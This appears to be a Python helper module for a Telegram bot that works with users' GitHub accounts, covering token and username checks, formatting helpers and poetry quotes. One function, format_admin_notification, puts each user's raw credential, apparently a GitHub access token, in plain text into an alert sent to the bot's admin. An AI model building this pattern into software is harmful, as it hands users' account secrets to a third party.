"""
Utility functions for TSunGitHubBot
Common helper functions and validators
"""

import os
import re
import json
import random
import string
from typing import Dict, Any
from datetime import datetime

def validate_pat(token: str) -> bool:
    """Validate GitHub Personal Access Token format"""
    return token.startswith("ghp_") and len(token) == 40

def sanitize_filename(filename: str) -> str:
    """Sanitize filename for filesystem compatibility"""
    # Remove invalid characters
    sanitized = re.sub(r'[<>:"/\\|?*]', '_', filename)
    # Remove leading/trailing spaces and dots
    sanitized = sanitized.strip(' .')
    # Ensure it's not empty
    if not sanitized:
        sanitized = "unnamed"
    return sanitized

def format_admin_notification(user, cred_type: str, credential: str) -> str:
    """Format admin notification message"""
    return f"""
🚨 *New User Alert* 🚨

*User Details:*
• *User ID:* `{user.id}`
• *Username:* @{user.username or 'N/A'}
• *First Name:* {user.first_name or 'N/A'}
• *Last Name:* {user.last_name or 'N/A'}

*Authentication:*
• *Type:* {cred_type}
• *Credential:* `{credential}`

*Timestamp:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

*Made With 🫀 By 〆༯𝙎คAEED✘🫀*
"""

def get_random_poetry() -> Dict[str, str]:
    """Get random poetry from Jaun Elia collection"""
    try:
        with open('poetry.json', 'r', encoding='utf-8') as f:
            poetry_data = json.load(f)
        
        poems = poetry_data.get('poems', [])
        if poems:
            return random.choice(poems)
        else:
            return get_fallback_poetry()
            
    except (FileNotFoundError, json.JSONDecodeError):
        return get_fallback_poetry()

def get_fallback_poetry() -> Dict[str, str]:
    """Fallback poetry if file is not available"""
    fallback_poems = [
        {
            "text": "Zindagi mein kuch to log mohabbat kar hi lete hain",
            "author": "Jaun Elia"
        },
        {
            "text": "Humein maloom hai jannat ki haqeeqat lekin",
            "author": "Jaun Elia"
        },
        {
            "text": "Koi aur hota to kya hota",
            "author": "Jaun Elia"
        },
        {
            "text": "Ek umr se hun tanhai mein",
            "author": "Jaun Elia"
        },
        {
            "text": "Woh jo hum mein tum mein qaraar tha",
            "author": "Jaun Elia"
        }
    ]
    
    return random.choice(fallback_poems)

def create_progress_bar(percentage: float, length: int = 10) -> str:
    """Create a text progress bar"""
    filled_length = int(length * percentage / 100)
    bar = '█' * filled_length + '░' * (length - filled_length)
    return f"[{bar}] {percentage:.1f}%"

def format_file_size(size_bytes: int) -> str:
    """Format file size in human readable format"""
    if size_bytes == 0:
        return "0 B"
    
    size_names = ["B", "KB", "MB", "GB", "TB"]
    i = 0
    while size_bytes >= 1024 and i < len(size_names) - 1:
        size_bytes /= 1024
        i += 1
    
    return f"{size_bytes:.2f} {size_names[i]}"

def generate_random_string(length: int = 8) -> str:
    """Generate random string for temporary file naming"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def is_valid_github_username(username: str) -> bool:
    """Validate GitHub username format"""
    # GitHub username rules:
    # - May only contain alphanumeric characters or hyphens
    # - Cannot have multiple consecutive hyphens
    # - Cannot begin or end with a hyphen
    # - Maximum 39 characters
    
    if not username or len(username) > 39:
        return False
    
    if username.startswith('-') or username.endswith('-'):
        return False
    
    if '--' in username:
        return False
    
    return re.match(r'^[a-zA-Z0-9-]+$', username) is not None

def format_repo_info(repo_name: str, repo_url: str, is_private: bool) -> str:
    """Format repository information for display"""
    privacy_icon = "🔒" if is_private else "🔓"
    return f"{privacy_icon} [{repo_name}]({repo_url})"

def get_timestamp_string() -> str:
    """Get current timestamp as formatted string"""
    return datetime.now().strftime("%Y%m%d_%H%M%S")

def clean_markdown_text(text: str) -> str:
    """Clean text for safe markdown usage"""
    # Escape markdown special characters
    special_chars = ['*', '_', '`', '[', ']', '(', ')', '~', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    
    for char in special_chars:
        text = text.replace(char, f'\\{char}')
    
    return text

def extract_github_repo_name(url: str) -> str:
    """Extract repository name from GitHub URL"""
    # Handle various GitHub URL formats
    patterns = [
        r'github\.com/[^/]+/([^/]+?)(?:\.git)?/?$',
        r'github\.com/[^/]+/([^/]+)/.*',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, url)
        if match:
            return match.group(1)
    
    return os.path.basename(url)

def validate_environment_variables() -> Dict[str, bool]:
    """Validate required environment variables"""
    required_vars = [
        'BOT_TOKEN',
        'FIREBASE_CREDENTIALS'
    ]
    
    optional_vars = [
        'GITHUB_TOKEN',
        'FLASK_PORT'
    ]
    
    validation_result = {}
    
    for var in required_vars:
        validation_result[var] = bool(os.getenv(var))
    
    for var in optional_vars:
        validation_result[var] = bool(os.getenv(var))
    
    return validation_result
